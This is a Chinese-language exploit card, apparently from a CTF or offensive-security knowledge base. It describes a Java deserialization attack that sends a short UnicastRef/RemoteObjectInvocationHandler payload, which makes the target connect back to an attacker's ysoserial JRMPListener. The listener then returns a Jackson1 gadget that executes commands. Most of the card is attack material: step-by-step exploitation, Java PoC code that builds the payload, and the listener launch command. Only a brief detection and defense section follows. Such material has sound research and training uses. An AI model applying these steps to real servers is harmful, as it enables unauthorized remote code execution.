---
id: web-java-deser-jrmpclient-unicastref-jackson1
title: JRMPClient 反序列化投递：UnicastRef+RemoteObjectInvocationHandler 使目标回连恶意 JRMPListener，再反序列化 Jackson1（JDK 8u191+ codebase 禁用时的替代）
type: scenario
domain: web
path: web/java/deserialization
technique: jrmpclient-unicastref-remoteobjectinvocationhandler-jackson1
aliases:
- JRMPClient
- UnicastRef 反序列化
- RemoteObjectInvocationHandler
- JRMPListener Jackson1
- JDK 8u191 后 JNDI 替代
- ysoserial JRMPListener
tags:
- java
- deserialization
- jrmp
- rmi
- unicastref
- jackson
- codebase
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T17:00:40+08:00'
  notes: 已对照原文13668图31-33核对：220字节长度限制入口、JDK8u202(>191)禁用RMI/LDAP codebase、UnicastRef+RemoteObjectInvocationHandler投递使目标回连JRMPListener、ysoserial JRMPListener Jackson1回投执行命令，均与原文一致；与Hibernate ActivatableRef卡（受害侧gadget触发JRMP）角色/入口不同；PoC未本机执行
---

## 一句话结论

当反序列化入口长度受限（如 220 字节）、且目标 JDK ≥ 8u191 已禁用 RMI/LDAP 的远程 codebase 时，可以只投递一个 `RemoteObjectInvocationHandler` 包装的 `UnicastRef`（指向攻击者 `JRMPListener`）作为"JRMP 客户端"引用；目标反序列化该引用后通过 JRMP/DGC 回连攻击者，`JRMPListener` 把 Jackson1 gadget 作为响应/异常发回，目标用 JDK 自己的流反序列化，从而执行命令。启动命令示例：`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8081 Jackson1 "calc.exe"`。

## 原理

- **JRMP 客户端引用**：`java.rmi.server.RemoteObjectInvocationHandler` 持有 `UnicastRef`（`LiveRef` = `ObjID` + `TCPEndpoint(host,port)`）；该对象可序列化。目标反序列化后，在 DGC/远程引用注册或后续调用时，会向 `TCPEndpoint` 指定的攻击者 JRMP 服务发起连接。
- **JRMPListener 回投**：ysoserial 的 `JRMPListener` 模拟 JRMP 服务端，对目标的调用返回（或在异常路径中携带）一段序列化对象；目标端的 JRMP 客户端会用 `ObjectInputStream` 反序列化该响应，于是内层 gadget 在目标上执行。
- **为什么绕过高版本 codebase 限制**：JDK 8u191/8u121 起，JNDI/RMI 的 `trustURLCodebase` 默认关闭，远程 codebase 加载 `.class` 不再可用；JRMP 这条路径不依赖 codebase，而是依赖"目标主动连回并反序列化响应"，属于反序列化投递通道。
- **为什么适合小输入**：payload 只有一个 `RemoteObjectInvocationHandler` + `UnicastRef`，序列化后很短；无需在入口塞入完整 gadget 链，内层 Jackson1 由 JRMP 服务端下发。
- **为什么用 Jackson1**：目标 classpath 有 Jackson 2.13（仍存在 `POJONode`/Templates 相关原生链），ysoserial 的 `Jackson1` 可在目标上执行命令；也可换其他可用链。
- **触发时机**：`UnicastRef` 在反序列化/注册阶段可能触发 DGC 通信；若未自动触发，目标业务对远程引用调用方法时也会连接。CTF 中通常反序列化即生效。

## 触发条件

- 存在原生反序列化入口，且入口对 payload 长度有限制（不足以放完整 gadget 链）。
- 目标 JDK ≥ 8u191（或已关闭 RMI/LDAP codebase），但允许出网到攻击者 JRMP 端口。
- classpath 存在可用内层 gadget（如 Jackson 2.13）。
- 目标反序列化时未启用会拦截 JRMP 引用的 JEP290 全局过滤器（或过滤器未覆盖 `RemoteObjectInvocationHandler`/`UnicastRef`）。

## 利用步骤

1. 在 VPS 启动 `ysoserial.exploit.JRMPListener <port> Jackson1 "<command>"`（或自定义 JRMP 服务端，返回可用 gadget）。
2. 在本地生成 payload：`ObjID` + `TCPEndpoint(vps, port)` → `LiveRef` → `UnicastRef` → `RemoteObjectInvocationHandler`；序列化并 Base64。
3. 把 Base64 提交到目标反序列化入口（如 `/backdoor?payload=...`，注意长度限制）。
4. 目标反序列化 `RemoteObjectInvocationHandler` 后回连 VPS 的 JRMP 端口；JRMPListener 下发 Jackson1 gadget。
5. 目标反序列化内层 gadget 执行命令；在 VPS 观察 JRMP 连接与命令回连。
6. 若未触发，检查目标是否对 `RemoteObjectInvocationHandler` 做了类名过滤、是否禁止出网、JRMPListener 的 gadget 是否与目标依赖匹配。

## PoC

```java
ObjID objID = new ObjID();
TCPEndpoint tcpEndpoint = new TCPEndpoint("vps-ip", 8081);
LiveRef liveRef = new LiveRef(objID, tcpEndpoint, false);
UnicastRef unicastRef = new UnicastRef(liveRef);
RemoteObjectInvocationHandler remote = new RemoteObjectInvocationHandler(unicastRef);

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(remote);
oos.close();
String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
```

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8081 Jackson1 "calc.exe"
```

原文在目标环境成功执行命令；本卡未在本机复跑。

## 变体与关联

- 变体：JRMP 服务端返回其他 gadget（CC、TemplatesImpl、Jackson 链），按目标依赖选择。
- 变体：目标侧 JRMP 二次反序列化也可由 Hibernate `ActivatableRef.getRef` 等服务端 gadget 触发，见 [[web-java-deser-hibernate-activatableref-jrmp-secondary-bypass]]。
- 关联：[[web-java-deser-kafka-ui-jmx-scala1-cc322-property-bypass]]（JMX/RMI 客户端反序列化攻击面）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（Jackson 内层链）、[[web-java-deser-jndi-ldapattribute-getattributedefinition-sink]]（JNDI 路径被禁用时的替代思路）。
- 边界：JEP290 全局过滤器、类名黑名单、禁止出网、JRMPListener 端口不可达、目标 JDK 对 `UnicastRef` 的过滤都会使链失效。

## 检测与防御

- 检测：反序列化流中出现 `java.rmi.server.RemoteObjectInvocationHandler`、`sun.rmi.server.UnicastRef`、`sun.rmi.transport.LiveRef`；目标向外部非业务端口发起 JRMP 连接；JRMP 协议特征流量。
- 防御：JEP290 全局过滤器覆盖 RMI 类；反序列化入口使用白名单；限制服务器出网到未知端口；升级 JDK 并保持默认安全属性；监控异常 JRMP 出站。
- 边界：合法 RMI 客户端也会出现这些类，需结合入口可控性与出网目的地判断。
